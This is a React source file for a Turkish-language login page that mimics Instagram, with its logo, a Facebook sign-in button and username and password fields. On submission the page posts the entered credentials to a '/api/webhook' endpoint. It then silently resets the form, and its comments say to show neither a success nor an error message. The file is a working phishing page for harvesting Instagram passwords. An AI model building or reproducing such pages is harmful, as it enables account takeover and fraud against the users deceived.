import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Loader2 } from "lucide-react";
import { LoginFormData, loginFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";

export default function Login() {
  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginFormSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const { mutate, isPending } = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const res = await apiRequest("POST", "/api/webhook", data);
      return res.json();
    },
    onSuccess: () => {
      // Sadece formu sıfırlayalım, başarı mesajı göstermeyelim
      form.reset();
    },
    onError: () => {
      // Hata mesajını da göstermeyelim
    },
  });

  function onSubmit(data: LoginFormData) {
    mutate(data);
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-start pt-6 bg-white max-w-md mx-auto overflow-hidden touch-none">
      <div className="w-full max-w-xs px-2">
        <div className="flex justify-center mb-5">
          <div className="relative">
            <select
              className="appearance-none text-sm font-medium text-gray-700 bg-transparent pr-8 focus:outline-none"
              defaultValue="tr"
            >
              <option value="tr">Türkçe</option>
            </select>
            <span className="absolute inset-y-0 right-0 flex items-center pointer-events-none">
              <svg className="h-4 w-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </span>
          </div>
        </div>
        
        <div className="flex justify-center mb-8 mt-12">
          <img src="/images/instagram_logo.png" alt="Instagram" className="h-14 w-auto" />
        </div>
        
        <Button
          type="button"
          className="w-full bg-[#0095F6] hover:bg-[#1877F2]/90 text-white font-medium py-2.5 px-4 rounded-lg text-sm mb-5 flex items-center justify-center"
        >
          <div className="bg-white rounded-full p-0.5 mr-2">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" className="h-4 w-4 fill-[#1877F2]">
              <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
            </svg>
          </div>
          Facebook ile Devam Et
        </Button>
        
        <div className="flex items-center my-4">
          <div className="flex-grow h-px bg-gray-300"></div>
          <span className="mx-4 text-sm text-gray-500 font-medium">YA DA</span>
          <div className="flex-grow h-px bg-gray-300"></div>
        </div>
        
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-3">
            <FormField
              control={form.control}
              name="username"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                      {...field}
                      className="w-full px-3 py-3 text-sm border border-gray-300 rounded-md bg-gray-50 focus:ring-0"
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500" />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type="password"
                      placeholder="Şifre"
                      {...field}
                      className="w-full px-3 py-3 text-sm border border-gray-300 rounded-md bg-gray-50 focus:ring-0"
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500" />
                </FormItem>
              )}
            />

            <div className="text-right">
              <a href="#" className="text-sm text-[#0095F6] font-medium">
                Şifreni mi unuttun?
              </a>
            </div>

            <Button
              type="submit"
              disabled={isPending}
              className="w-full bg-[#0095F6] hover:bg-[#0095F6]/90 text-white font-medium py-2 px-4 rounded-lg text-sm mt-3"
            >
              {isPending ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Giriş yapılıyor...
                </>
              ) : (
                "Giriş yap"
              )}
            </Button>
          </form>
        </Form>
        
        <div className="mt-10 text-center pb-3">
          <p className="text-sm">
            Hesabın yok mu? <a href="#" className="text-[#0095F6] font-medium">Kaydol</a>
          </p>
        </div>
        
        <div className="border-t border-gray-200 mt-12 pt-10 text-center text-xs text-gray-500">
          <p className="mb-4 px-8">
            Ayrıca ülkende giriş yapmadan <span className="text-[#00376B]">yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin</span>.
          </p>
        </div>
      </div>
    </div>
  );
}
